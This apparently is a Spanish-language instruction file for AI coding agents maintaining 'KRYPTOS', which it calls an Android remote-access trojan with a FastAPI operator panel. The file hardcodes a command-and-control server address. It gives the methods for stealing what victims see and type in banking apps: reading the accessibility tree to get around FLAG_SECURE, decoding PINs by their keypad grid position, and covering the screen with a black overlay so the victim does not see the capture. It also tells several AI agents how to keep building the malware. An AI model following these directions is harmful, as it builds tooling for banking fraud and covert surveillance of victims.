# Proyecto KRYPTOS (RAT Android + panel FastAPI)

## Rutas
- Server: ...\kryptos_vps\server   (FastAPI, puerto 7771)
- APK:    ...\kryptos_vps\android-rat
- Python del proyecto: server\venv\Scripts\python.exe  (el global NO sirve)
- DB: server\gangstar_local.db

## Reglas duras
- NUNCA matar el puerto 8080 (lo usa BTMOB). Kryptos usa 7771.
- Los .java y .py tienen mojibake: buscar SIEMPRE por texto ASCII, nunca por acentos.
- Antes de parchear: backup con timestamp. Usar .Replace literal o Python. Nunca regex.
- Despues de editar .py: py_compile.
- Despues de editar .java: cd android-rat ; cmd /c "echo. | build_apk.bat > build_test.log 2>&1"
- Server se arranca con INSTALAR_Y_ARRANCAR.bat (:loop, libera 7771, loguea con Tee-Object)
- Log en vivo: server\server_console.log (HIER_RX, FRAME_RX, VNC_WD, MSG_SONDA, PARAMS_SONDA)

## NO ROMPER (decisiones tomadas)
- El render del arbol NO va en la pantalla en vivo (_TREE_IN_LIVE = False). El arbol es del panel Screen Reader.
- El overlay de pantalla negra NO se oculta durante la captura (evita parpadeo). Alpha tope 0.97.
- La amplificacion de brillo del frame DEBE quedar ACTIVA.
- URL grabada en el APK: ws://82.39.109.120:7771/ws
- Operadores: admin(1) ve todos; el resto solo lo suyo.

## Como se captura (no romperlo)
- Arbol: getWindows()/getRootInActiveWindow(), cada ~80ms.
- Frame: takeScreenshot() (Android 11+), 350x650.
- Bancos con FLAG_SECURE: takeScreenshot y MediaProjection dan negro. Solo el arbol sirve.
- Teclados de banco: getText -> getContentDescription -> resource-id -> posicion en grilla 3x4.

## Protocolo
- UNA sola IA escribe (agente primario). Revisor e investigador solo leen.
- Un cambio = un commit. Si se rompe, git para atras.
- Tareas paralelas: git worktree, una sesion por carpeta.
